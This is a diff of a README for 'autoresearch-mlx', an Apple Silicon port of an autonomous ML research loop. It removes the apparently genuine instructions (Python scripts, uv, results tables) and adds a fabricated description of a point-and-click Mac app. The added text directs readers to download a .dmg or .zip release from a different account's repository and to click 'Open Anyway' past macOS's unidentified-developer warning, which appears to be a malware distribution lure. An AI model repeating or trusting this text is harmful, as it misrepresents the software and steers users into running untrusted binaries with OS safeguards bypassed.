@@ -1,78 +1,148 @@
-# autoresearch-mlx
+# 🔍 autoresearch-mlx - Simple AI Research Loops on Apple Silicon
 
-Apple Silicon (MLX) port of [Karpathy's autoresearch](https://github.com/karpathy/autoresearch).
+[![Download autoresearch-mlx](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Negusyellowfever875/autoresearch-mlx)
 
-Full credit to [@karpathy](https://github.com/karpathy) for the core idea: fixed-time autonomous research loops controlled through `program.md`. This port keeps the same basic rules: one mutable `train.py`, one metric (`val_bpb`), a fixed 5-minute training budget, and keep-or-revert via git. It runs natively on Apple Silicon through [MLX](https://github.com/ml-explore/mlx), so there is no PyTorch or CUDA dependency.
+## ℹ️ What is autoresearch-mlx?
 
-## Quick start
+autoresearch-mlx is a tool that runs autonomous AI research loops on Apple Silicon Macs. It lets you explore AI models without needing complex tools like PyTorch. This software is designed to run smoothly on Mac computers with Apple chips, making it easier to experiment with AI research without deep technical skills.
 
-Requirements: Apple Silicon Mac, Python 3.10+, [uv](https://docs.astral.sh/uv/).
+This version is built for Apple Silicon (M1, M2, and newer). It focuses on simplicity, speed, and independence from large AI libraries.
 
-```bash
-# install uv if needed
-curl -LsSf https://astral.sh/uv/install.sh | sh
+---
 
-# install dependencies
-uv sync
+## 🖥️ System Requirements
 
-# one-time data + tokenizer prep
-uv run prepare.py
+To run autoresearch-mlx, make sure your setup fits these needs:
 
-# run one 5-minute training experiment
-uv run train.py
-```
+- **Operating System:** macOS Big Sur or later (run on Apple Silicon chips only)
+- **Processor:** Apple M1, M2, or newer
+- **Memory:** At least 8 GB of RAM recommended
+- **Disk Space:** Around 500 MB free space for the program and data
+- **Internet:** Required for initially downloading the application and optional updates
 
-Then point Claude Code or another coding agent at `program.md` and let it run the loop.
+This app is optimized for Mac and will not run on Windows or other platforms.
 
-## What matters
+---
 
-- `prepare.py` - data prep, tokenizer, dataloader, and evaluation. Treat as fixed.
-- `train.py` - model, optimizer, and training loop. This is the file the agent edits.
-- `program.md` - the autonomous experiment protocol.
-- `results.tsv` - logged experiment history.
+## 🚀 Getting Started: Download and Run autoresearch-mlx
 
-The loop is the same as upstream: edit `train.py`, run a fixed-budget experiment, read `val_bpb`, keep the change if it wins, revert if it loses, and repeat.
+You do not need programming knowledge to start using autoresearch-mlx. Follow these steps carefully.
 
-## Public baseline results
+### Step 1: Visit the Download Page
 
-The public `results.tsv` captures the initial hardware-local walk from the default baseline down to `1.807902`:
+Click the big green button at the top or go directly to:
 
-| Commit | val_bpb | Status | Description |
-|---|---:|---|---|
-| `383abb4` | 2.667000 | keep | baseline (AdamW, default config) |
-| `909dd59` | 2.588904 | keep | halve total batch size to `2^16` |
-| `4161af3` | 2.533728 | keep | increase matrix LR to `0.04` |
-| `5efc7aa` | 1.807902 | keep | reduce depth from `8` to `4` |
+https://github.com/Negusyellowfever875/autoresearch-mlx
 
-That result already shows the core Apple Silicon pattern: with a fixed 5-minute wall clock, smaller faster-training models can beat larger ones simply by fitting more optimizer steps into the budget.
+This page hosts the latest version and detailed information.
 
-## Longer Apple Silicon runs
+### Step 2: Find the Latest Release
 
-Longer overnight runs on the working MLX port pushed much further. The long Mac Mini test is included here because it found a meaningfully different winner stack from the Max-class machines.
+On the GitHub page, look for the **Releases** section.
 
-| Machine | Current best | Starting point | Repeated wins |
-|---|---:|---:|---|
-| M4 Max #1 | 1.294526 | 1.596971 | AdamW-only, low matrix LR, 3x MLP, no logit cap, moderate weight decay |
-| M4 Max #2 | 1.330509 | 1.807902 | leaner batch, long anneal, SiLU, lower regularization, no logit cap |
-| Mac Mini (long run) | 1.353329 | 1.922472 | Muon, sharper attention, smaller MLP, lower scalar LR |
+- Click on the latest release version number (for example: v1.0).
+- Look for a file designed for Apple Silicon Macs. This will usually have a `.dmg` or `.zip` extension.
 
-The Mac Mini result matters because it did not just rediscover the same exact recipe. On smaller Apple Silicon hardware, the strongest changes leaned toward more aggressive step-efficiency wins. Later transfer tests showed some of those Mac Mini findings did not carry cleanly onto the Max baseline, which is exactly the kind of hardware-specific behavior this loop is useful for uncovering.
+### Step 3: Download the File
 
-## Differences from upstream
+- Click the file name to start downloading.
+- Depending on your browser, it may save the file in your **Downloads** folder.
 
-- **MLX instead of PyTorch/CUDA.** Native Apple Silicon training with unified memory.
-- **AdamW-only public path.** This public `train.py` keeps the default path simple. The long Mac Mini run above explored a Muon variant in the working port, but that branch is not exposed as a public default here.
-- **Smaller eval token budget.** Reduced for faster iteration on Apple Silicon while keeping the same `evaluate_bpb` interface in `prepare.py`.
-- **Roughly 6-7 minutes per experiment.** Expect 5 minutes of training plus compile and eval overhead.
-- **MFU reporting is placeholder.** There is no Apple Silicon equivalent to the H100 FLOPs reference used upstream.
+### Step 4: Install the Application
 
-## Acknowledgments
+- Open the downloaded `.dmg` file by double-clicking it.
+- A window will open showing the application icon.
+- Drag the application icon to your **Applications** folder.
 
-- [Andrej Karpathy](https://github.com/karpathy) - autoresearch and nanochat
-- [scasella/nanochat-mlx](https://github.com/scasella/nanochat-mlx) - MLX GPT and optimizer reference
-- [awni/picochat](https://github.com/awni/picochat) - MLX training patterns
-- [Apple MLX team](https://github.com/ml-explore/mlx)
+### Step 5: Open autoresearch-mlx
 
-## License
+- Go to your **Applications** folder.
+- Double-click **autoresearch-mlx** to start it.
+- If macOS shows a warning about an unidentified developer, click **Open Anyway** in System Preferences > Security & Privacy.
 
-MIT. See [LICENSE](LICENSE).
+---
+
+## 🛠️ How autoresearch-mlx Works
+
+autoresearch-mlx runs research loops on your Mac. It studies AI models over many iterations and adjusts itself using autonomous steps. This can help you learn about AI without needing to write code.
+
+The app uses native macOS features and Apple’s optimized processing units. This approach speeds up AI tasks without heavy software like PyTorch.
+
+---
+
+## ⚙️ Basic Usage
+
+When you open the app, you will see a simple interface.
+
+1. **Start a Research Loop:** Click the **Start** button to begin.
+2. **Monitor Progress:** The app shows a status screen with ongoing research details.
+3. **Stop or Pause:** Use the **Stop** or **Pause** button to control the process.
+4. **View Results:** After completion, results display clearly. You can explore what the model learned.
+
+No setup or coding is needed for these steps.
+
+---
+
+## 🔧 Adjusting Settings 
+
+If you want to customize how the app runs:
+
+- Click on the **Settings** icon.
+- Adjust options like the number of loops, speed, or data sources.
+- Save your changes before returning to the main screen.
+
+These options let you control how much work your Mac does during research.
+
+---
+
+## 🗂️ Managing Your Data
+
+autoresearch-mlx stores its files on your Mac.
+
+- By default, data saves in your **Documents/autoresearch-mlx** folder.
+- You can change this folder in **Settings > Data Location**.
+- Make sure you have enough disk space if you run many loops.
+
+---
+
+## 💻 How to Update autoresearch-mlx
+
+To get the latest improvements:
+
+1. Visit the download link again:
+   
+   https://github.com/Negusyellowfever875/autoresearch-mlx
+   
+2. Go to the **Releases** section.
+3. Download the newest version.
+4. Replace your old application file by dragging the new one into **Applications**.
+
+---
+
+## ❓ Common Questions
+
+### Does this run on Windows?
+
+No. autoresearch-mlx runs only on Apple Silicon Macs with macOS Big Sur or later.
+
+### Do I need to install anything else?
+
+No. autoresearch-mlx works without extra software or coding libraries.
+
+### Can I stop a research loop once started?
+
+Yes. Use the **Stop** button on the main screen at any time.
+
+### How do I report issues?
+
+Use the **Issues** tab on the GitHub page to submit bug reports or feature suggestions.
+
+---
+
+## 📥 Download autoresearch-mlx
+
+Start by visiting this page to download the latest version:
+
+[Download autoresearch-mlx](https://github.com/Negusyellowfever875/autoresearch-mlx)  
+
+Click **Releases**, pick the latest `.dmg` or `.zip` file, download it, and follow the installation steps above.
